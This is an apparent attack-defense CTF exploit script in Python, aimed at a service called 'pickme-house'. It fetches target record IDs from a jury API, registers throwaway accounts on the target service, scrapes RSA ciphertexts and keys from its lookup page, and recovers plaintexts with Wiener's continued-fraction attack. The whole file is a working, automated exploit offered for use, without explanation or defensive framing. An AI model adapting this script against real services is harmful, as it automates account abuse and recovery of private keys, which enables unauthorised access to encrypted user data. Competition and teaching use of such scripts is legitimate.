import sys
import requests
import secrets
import json
from bs4 import BeautifulSoup
from Crypto.Util.number import long_to_bytes


JURY_IP = "10.10.10.10"
IP = sys.argv[1]
BASE_APP = f"http://{IP}:10000"

def get_attack_data():
    data = requests.get(f"http://{JURY_IP}/api/client/attack_data").json()['pickme-house'][IP]
    idlvl3 = []
    
    for item in data:
        user = {}
        item = item.replace("'", '"')
        user = json.loads(item)

        if  user.get('level', '').strip() == '3':
            rec_id = user.get('rec_id')
            if rec_id:
                idlvl3.append(rec_id)

    return idlvl3

def continued_fraction(n, d):
    cf = []
    while d:
        q, r = divmod(n, d)
        cf.append(q)
        n, d = d, r
    return cf

def convergents(cf):
    num, den = [], []
    for i, q in enumerate(cf):
        if i == 0:
            num.append(q)
            den.append(1)
        elif i == 1:
            num.append(num[0]*q + 1)
            den.append(den[0]*q)
        else:
            num.append(num[i-1]*q + num[i-2])
            den.append(den[i-1]*q + den[i-2])
        yield (num[i], den[i])

def wiener_attack(c, e, n):
    cf = continued_fraction(e, n)
    for k, d in convergents(cf):
        if k == 0:
            continue
        if d <= 0:
            continue
        try:
            m = pow(c, d, n)
            plaintext = long_to_bytes(m)
            if len(plaintext) == 0:
                continue
            try:
                decoded = plaintext.decode('utf-8')
            except UnicodeDecodeError:
                continue

            sample = decoded[:min(200, len(decoded))]
            if any(ch.isprintable() or ch in '\t\n\r' for ch in sample):
                return d, plaintext
        except:
            continue
    return None, None

def register_user(session, base_url, username, password):
    url = f"{base_url}/register"
    data = {
        'user': username,
        'pwd': password,
        'pwd2': password
    }
    session.cookies.clear()
    try:
        response = session.post(url, data=data, allow_redirects=False)
        location = response.headers.get('Location', '')
        return response.status_code == 302 and 'login' in location
    except:
        return False

def login_user(session, base_url, username, password):
    url = f"{base_url}/login"
    data = {
        'user': username,
        'pwd': password
    }
    try:
        response = session.post(url, data=data, allow_redirects=True)
        return '/index' in response.url or '/login' not in response.url
    except:
        return False

def get_level3_data(session, base_url, rec_id):
    url = f"{base_url}/lookup"
    data = {
        'level': '3',
        'rec_id': rec_id
    }
    try:
        response = session.post(url, data=data)
        if response.status_code != 200:
            return None, None, None
        
        soup = BeautifulSoup(response.text, 'html.parser')
        
        if soup.find(string=lambda text: text and ('Нет такой записи' in text or '❌' in text)):
            return None, None, None
        
        field_rows = soup.find_all('div', class_='field-row')
        
        ct_hex = None
        n_str = None
        e_str = None
        
        for row in field_rows:
            label = row.find('div', class_='field-label')
            value = row.find('div', class_='field-value')
            
            if not label or not value:
                continue
            
            label_text = label.get_text(strip=True)
            value_text = value.get_text(strip=True)
            
            if 'Шифротекстик' in label_text:
                ct_hex = value_text
            elif 'n' in label_text:
                n_str = value_text
            elif 'e' in label_text:
                e_str = value_text
        
        if not (ct_hex and n_str and e_str):
            return None, None, None
        
        c = int(ct_hex, 16)
        n = int(n_str, 16)
        e = int(e_str, 16)
        return c, n, e
    except:
        return None, None, None

def main():
    session = requests.Session()
    pickmeloxi = get_attack_data()
    
    for lox_id in pickmeloxi:
        username = f"pickmeloxi{secrets.token_hex(8)}"
        password = secrets.token_hex(16)
        
        if not register_user(session, BASE_APP, username, password):
            print("не удалось зарегистрировать пользователя")
            continue
        
        if not login_user(session, BASE_APP, username, password):
            print("не удалось войти")
            continue
        
        c, n, e = get_level3_data(session, BASE_APP, lox_id)
        
        if c is None or n is None or e is None:
            print("не удалось получить данные")
            continue
        
        d, plaintext = wiener_attack(c, e, n)
        
        if d is None:
            continue
            
        print(plaintext.decode('utf-8'))

if __name__ == '__main__':
    main()
